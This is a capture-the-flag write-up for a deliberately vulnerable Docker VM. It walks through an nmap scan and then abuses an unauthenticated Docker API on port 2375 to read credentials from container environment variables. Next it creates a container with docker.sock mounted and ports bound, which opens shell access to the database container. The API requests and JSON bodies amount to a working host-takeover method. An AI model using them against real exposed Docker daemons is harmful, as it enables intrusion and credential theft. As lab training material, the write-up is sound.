# Vulnerable-Docker-VM
This is a writeup for the EASY mode of the Down By The Docker CTF by [notsosecure.com](https://www.notsosecure.com/vulnerable-docker-vm/)



## First things first

We got an IP of the server - so lets scan it with nmap:

```bash
nmap -T4 -p- -oN Documents/ports 192.168.253.129
```

Reviewing the results we got:

|PORT    | STATE |SERVICE|
|--------|-------|-------|
|22/tcp  | open  |ssh|
|2375/tcp| open  |docker|
|8000/tcp| open  |http-alt|

The 8000 port is a wordpress site, but we're interested, right now, on the docker's one.

HTTP OPTIONS request to port 2375, reveal:
```bash
Api-Version → 1.30
...
Server → Docker/17.06.0-ce (linux)
...
```

This is Docker API version 1.30. Here you can find its documentation:

https://docs.docker.com/engine/api/v1.30/


OK, apperantly the server expose to us the docker deamon itself, so our first goal, to reach any kind of control, is fullfilled. 

Next, lets check this out.

**A small side note**, for everyone who's not familiar with the docker API: Now we realize that we probably passed the main vulnerability: The docker deamon is the heart of this server and challenge - if we can send it commands - we won. So this is not really a CTF per se, it is more kind of navigating ourself through the docker configuration and misconfiguration.



## Checking what we're dealing with
This is my first time with the docker API but I do know a little bit about docker and docker commands, so let see if we can get anything special - lets try to get a list of the containers. I used Postman to send HTTP requests:
```bash
http://192.168.253.129:2375/containers/json
```
And indeed, we get a list of the running containers inside the server:

| Name                  | Image                      |
|-----------------------|----------------------------|
| content_wordpress_1   | wordpress:latest           |
| content_db_1          | mysql:5.7                  |
| content_ssh_1         | jeroenpeeters/docker-ssh   |


We can now try to inspect each container to search for any interesting variables:

#### content_wordpress_1:

```bash
http://192.168.253.129:2375/containers/content_wordpress_1/json
```
```javascript
{
...
"HostConfig": {
        ...
        "PortBindings": {
            "80/tcp": [
                {
                    "HostIp": "",
                    "HostPort": "8000"
                }
            ]
        },
        ...
}
...
"Env": [
            ...
            "WORDPRESS_DB_HOST=db:3306",
            "WORDPRESS_DB_USER=wordpress",
            "WORDPRESS_DB_PASSWORD=WordPressISBest",
            ...
        ],
...
}
```

Enviroment variables holds several key values necessary for the containers' service. Each container type has its own variables. Here we can see the site database host, its user and password.

We'll get to the HostConfig shortly.


#### content_db_1:

```bash
http://192.168.253.129:2375/containers/content_db_1/json
```
```javascript
{
...
"Env": [
            ...
            "MYSQL_ROOT_PASSWORD=Peaches123",
            "MYSQL_PASSWORD=WordPressISBest",
            "MYSQL_USER=wordpress",
            "MYSQL_DATABASE=wordpress",
            ...
        ],
...
}
```

Each mysql container needs to be initialized with root password, this variable is mandatory. Also we can see here that the container was created with the wordpress database and user.

#### content_ssh_1:

```bash
http://192.168.253.129:2375/containers/content_ssh_1/json
```
```javascript
{
...
"Env": [
            "AUTH_MECHANISM=noAuth",
            "CONTAINER=content_db_1",
            "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
            "CONTAINER_SHELL=bash",
            "KEYPATH=./id_rsa",
            "PORT=22",
            "HTTP_ENABLED=true",
            "HTTP_PORT=8022"
        ],
...
}
```

This is interesting, seemingly we have a SSH container that connects us to the mysql container. The `HTTP_ENABLED` and `HTTP_PORT` variables are also interesting - do we have a SSH web API?

Checking http://192.168.253.129:8022/ reach us nowhere - why it's not working? 

Nor the SSH 22 port: It seems as if no authentication is needed, according to the `AUTH_MECHANISM` - but we still get:
```bash
PS C:\> ssh 192.168.253.129
user@ad@192.168.253.129's password:
Permission denied, please try again.
```

So, what's going on?

## Few seconds on docker's ports
Remember `HostConfig` we've noticed in the wordpress container's inspect request? We can see there a value named `PortBindings`. This value tells us that the docker deamon binds the host machine's 8000 port to the container's 80 port. Every request sent to the host machine to port 8000 is tunneled to port 80 on the wordpress container. By default, all ports on the container are isolated from the outside, and we need explicitly to bind a port for it to be seen from the outside. This is why we can view the site when we go to http://192.168.253.129:8000. 

On the content_ssh_1 container, the `PortBindings` is empty - so no external request is tunneled to this container. This is explains the Premission denied of the SSH connection - this is the SSH of the host machine, which, for a change - is locked.

OK, we want to bind the SSH port so we can connect to the mysql container. But, this kind of binding can only be done when the container is initiated. This is mean that we need to get our hands a little bit dirty and create and initiate a new container on the remote host.

## Let's get dirty
The creattion and initiation of containers with the Docker API is quite easy - we just need to know what kind of container and what kind of environment variables we need. 

The image of the SSH container is `jeroenpeeters/docker-ssh` - so we better read it's documentation and understand what is needed for it to work. You can find it [here](https://hub.docker.com/r/jeroenpeeters/docker-ssh/).

Long stroy short (although the long one is not so long):
- The main idea of this container is to create a SSH connection to containers that does not come with one originally.
- It doing so by using the EXEC docker command to open a bash in the target container and tunnel it to the SSH connection through the external port, outside.
- In order to do so, the SSH container needs to initiated with the docker.sock mounted to it. Docker.sock is the socket which the docker deamon is listen to - to get commands.
- Mounting means that the socket itself (or whatever else you're mounting) is connected from the host machine directly to a  certain path in the container. This means that who ever have access to the container has access to the host machine. Later, we're going to use this feature to scan the host machine files.
- We need to remember to bind some external ports to port 22 and port 8022 on the container - so we can connect to it.
- The 8022 port is for a Web API - which is very nice feature of this image.

We know, more or less, what configuration we needs to connect the SSH container to the DB container. Now we need to look at the Docker API to see how we need to configure it. You can see that it is pretty straight forward:

POST request to:
```bash
http://192.168.253.129.98:2375/containers/create?name=content_ssh_2
```
With body:
```javascript
{
	"Image": "jeroenpeeters/docker-ssh",
	
	"Name" : "content_ssh_2",
	
	"HostConfig": {
			"Binds": [
				"/var/run/docker.sock:/var/run/docker.sock:rw",
				"/usr/bin/docker:/usr/bin/docker:rw"
				],
            "PortBindings": {
                "22/tcp": [
                    {
                        "HostIp": "0.0.0.0",
                        "HostPort": "2220"
                    }
            	],
				"8022/tcp": [
                    {
                        "HostIp": "0.0.0.0",
                        "HostPort": "8822"
                    }
                ]
            }
	},
	
	"Env": [
            "AUTH_MECHANISM=noAuth",
            "CONTAINER=content_db_1",
            "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
            "CONTAINER_SHELL=bash",
            "KEYPATH=./id_rsa",
            "PORT=22",
            "HTTP_ENABLED=true",
            "HTTP_PORT=8022"
			]
}
```

Upon successful creation we will recieve the following response:
```javascript
{
    "Id": "a4ca050cf4e32d01d3c67c83c52eef4fb03f03151de0982230791a9866cd9933",
    "Warnings": null
}
```
We can reference a container by its Id or by its name.

After creating the container we need to start it, otherwise it's just an image sitting there, doing nothing but aging:
POST request to:
```bash
http://192.168.253.129:2375/containers/content_ssh_2/start
```
Status 204 means everything went alright.

Just to make sure we can check the containers list:
```bash
http://192.168.253.129:2375/containers/json
```

OK, and now we can test it:
```bash
http://192.168.253.129:8822/
```
And we should get:

<center><img alt="content_db_1 ssh web API" src="files/images/db_1-ssh.PNG" /></center>





